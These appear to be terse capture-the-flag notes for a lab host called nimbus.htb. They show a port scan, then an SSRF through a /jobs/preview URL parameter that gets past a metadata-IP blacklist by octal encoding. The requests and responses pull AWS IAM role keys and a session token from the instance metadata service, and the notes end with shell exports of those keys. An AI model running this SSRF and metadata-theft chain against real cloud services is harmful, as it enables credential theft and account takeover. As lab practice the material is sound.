network enumeration:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
http://nimbus.htb/api/v1/health

{"services":{"queue":{"endpoint":"http://aws.nimbus.htb","status":"ok"},"scheduler":{"endpoint":"http://aws.nimbus.htb","status":"ok"},"storage":{"endpoint":"http://aws.nimbus.htb","status":"ok"}},"status":"healthy","version":"1.4.2"}


also also know the nimbus v1.4.2
Hint: Your SSH key needs to be approved by a DevOps lead. Ping marcus on Slack.
```

```
first test the endpoint /jobs/preview where the url is passed i test the ssrf

i test 169.254.169.254 which is blacklist so i 
Encode the IMDS IP in octal: 169.254.169.254 into 0251.0376.0251.0376

then test first:

url=http://0251.0376.0251.0376/latest/meta-data/?a=test.yaml

Response:

<h3>Raw response</h3><pre>ami-id
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
placement/
security-groups
</pre>
<h3>Parsed</h3><pre>ami-id hostname iam/ instance-id instance-type local-hostname local-ipv4 placement/ security-groups</pre>

then:

url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml 

Response:

<div class="panel">
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=test.yaml</code> · HTTP 200</div>
<h3>Raw response</h3><pre>nimbus-web-role</pre>
<h3>Parsed</h3><pre>nimbus-web-role</pre>
</div>

then:

url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml

Response:

<div class="panel">
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?a=test.yaml</code> · HTTP 200</div>
<h3>Raw response</h3><pre>{
  &#34;Code&#34;: &#34;Success&#34;,
  &#34;LastUpdated&#34;: &#34;2026-06-23T01:47:44Z&#34;,
  &#34;Type&#34;: &#34;AWS-HMAC&#34;,
  &#34;AccessKeyId&#34;: &#34;ASIAQX4PG7L2K9M3N5R8&#34;,
  &#34;SecretAccessKey&#34;: &#34;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#34;,
  &#34;Token&#34;: &#34;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#34;,
  &#34;Expiration&#34;: &#34;2026-06-23T07:47:44Z&#34;
}</pre>
<h3>Parsed</h3><pre>{&#39;Code&#39;: &#39;Success&#39;, &#39;LastUpdated&#39;: &#39;2026-06-23T01:47:44Z&#39;, &#39;Type&#39;: &#39;AWS-HMAC&#39;, &#39;AccessKeyId&#39;: &#39;ASIAQX4PG7L2K9M3N5R8&#39;, &#39;SecretAccessKey&#39;: &#39;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#39;, &#39;Token&#39;: &#39;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#39;, &#39;Expiration&#39;: &#39;2026-06-23T07:47:44Z&#39;}</pre>
</div>
```

```
Credential:

export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM"
export AWS_DEFAULT_REGION="us-east-1"
```





